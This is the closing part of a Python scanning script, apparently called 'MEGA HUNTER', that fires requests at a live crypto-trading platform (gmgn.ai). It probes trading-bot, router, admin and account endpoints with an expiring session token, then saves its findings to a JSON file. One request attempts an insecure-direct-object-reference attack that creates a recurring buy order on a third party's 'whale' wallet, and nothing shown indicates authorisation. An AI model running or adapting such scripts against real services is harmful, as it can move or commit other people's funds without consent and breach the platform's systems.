    test_endpoint("GET", "/tapi/v1/trading_bot/strategy_order/open_order_count",
                  description="Open order count")
    
    # 6. Smart trade v2 create (new trading bot version)
    test_endpoint("POST", "/tapi/v1/trading_bot/smart_trade_v2/create",
                  payload={"chain": "sol", "wallet_address": OUR_SOL_WALLET},
                  description="Smart trade v2 — new bot endpoint")
    
    # 7. DCA order on whale wallet (IDOR)
    test_endpoint("POST", "/tapi/v1/trading_bot/dca_order/create",
                  payload={"chain": "sol", "wallet_address": TARGET_SOL_WHALE,
                          "base_token": "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
                          "quote_token": "So11111111111111111111111111111111111111112",
                          "amount_per_order": "100000", "interval": 3600,
                          "total_orders": 10},
                  description="IDOR: DCA order on whale wallet!")
    
    # 8. Token security check (useful intelligence)
    test_endpoint("GET", "/api/v1/token_security_sol?token=DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
                  description="Token security SOL — BONK")
    
    # 9. Router allowance (reveals DEX router contracts)
    test_endpoint("POST", "/tapi/v1/router/allowance",
                  payload={"chain": "bsc", "wallet_address": OUR_BSC_WALLET,
                          "token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"},
                  description="Router allowance — contract info")
    
    test_endpoint("POST", "/tapi/v1/router/approve_address",
                  payload={"chain": "bsc"},
                  description="Router approve address")

# ============================================================================
# MAIN
# ============================================================================
def main():
    print("="*80)
    print(f"🎯 MEGA HUNTER — gmgn.ai Comprehensive Security Audit")
    print(f"   Started: {datetime.now(timezone.utc).isoformat()}")
    print(f"   Token expires: epoch 1784062504")
    print(f"   Time remaining: ~{(1784062504 - int(time.time()))//60} minutes")
    print("="*80)
    
    phase_wallet_api()
    phase_trading_api()
    phase_user_social()
    phase_vas_tg()
    phase_referral()
    phase_admin()
    phase_account()
    phase_solana()
    
    # ========================================================================
    # RESULTS
    # ========================================================================
    print("\n" + "="*80)
    print(f"📊 SCAN COMPLETE — {request_count} requests sent")
    print("="*80)
    
    if findings:
        print(f"\n🔥 {len(findings)} FINDINGS:")
        for i, f in enumerate(findings, 1):
            print(f"\n  [{i}] {f['severity']} | {f['category']}")
            print(f"      Endpoint: {f['endpoint']}")
            print(f"      Detail: {f['detail']}")
            if f['response_snippet']:
                print(f"      Response: {f['response_snippet'][:200]}")
    else:
        print("\n  No critical findings captured (check output above for details)")
    
    # Save results
    results = {
        "scan_timestamp": datetime.now(timezone.utc).isoformat(),
        "total_requests": request_count,
        "findings": findings,
    }
    
    with open("/projects/sandbox/gmg/MEGA_HUNTER_RESULTS.json", "w") as fp:
        json.dump(results, fp, indent=2)
    
    print(f"\n✅ Results saved to MEGA_HUNTER_RESULTS.json")

if __name__ == "__main__":
    main()
